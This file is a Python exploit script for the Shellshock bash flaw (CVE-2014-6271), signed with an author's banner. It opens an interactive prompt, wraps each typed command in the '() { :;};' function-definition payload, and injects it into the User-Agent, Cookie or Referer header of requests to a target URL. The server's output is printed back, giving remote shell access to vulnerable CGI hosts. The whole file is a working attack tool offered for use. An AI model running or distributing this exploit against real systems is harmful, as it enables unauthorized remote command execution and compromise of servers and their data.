#!/usr/bin/env python
# bash-shell 0day CVE-2014-6271

import sys, os, urllib2, argparse

def cleaner():
	if 'linux' in sys.platform:
		os.system('clear')
	else:
		os.system('cls')

def banner():
	cleaner()
	print '''
______           _           _____     _             
| ___ \         | |         |  _  |   | |            
| |_/ / __ _ ___| |__ ______| |/' | __| | __ _ _   _ 
| ___ \/ _` / __| '_ \______|  /| |/ _` |/ _` | | | |
| |_/ / (_| \__ \ | | |     \ |_/ / (_| | (_| | |_| |
\____/ \__,_|___/_| |_|      \___/ \__,_|\__,_|\__, |
                                                __/ |
                                               |___/ 
#####################################################
#Author: Muhammad Adeel aka Stoker                  #
#Mail:   Chaudhary1337@gmail.com                    #
#Blog:   http://urdusecurity.blogspot.com           #
#####################################################
\n'''

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", help="exploit User-Agent parameter", action="store_true")
	parser.add_argument("-c", help="exploit Cookie parameter", action="store_true")
	parser.add_argument("-r", help="exploit Referer parameter", action="store_true")
	parser.add_argument("ip", help="vulnerable URL/IP")
	args = parser.parse_args()

	try:
		while True:
			command = raw_input("w00t@UrduSecurity~$ ")
			if command.strip() == 'exit':
				break
			query = "() { :;}; echo \"Content-Type: text/html\"; echo; echo; /bin/bash -c \"" + command + "\""
			request = urllib2.Request(args.ip)	
			if args.u:
		    		request.add_header("User-Agent", query)
			if args.c:
		    		request.add_header("Cookie", query)
			if args.r:
		    		request.add_header("Referer", query)
			result = urllib2.urlopen(request).read()
			print result.strip()
	except:
   		print sys.exc_info()[1]

if __name__ == "__main__":
   main()
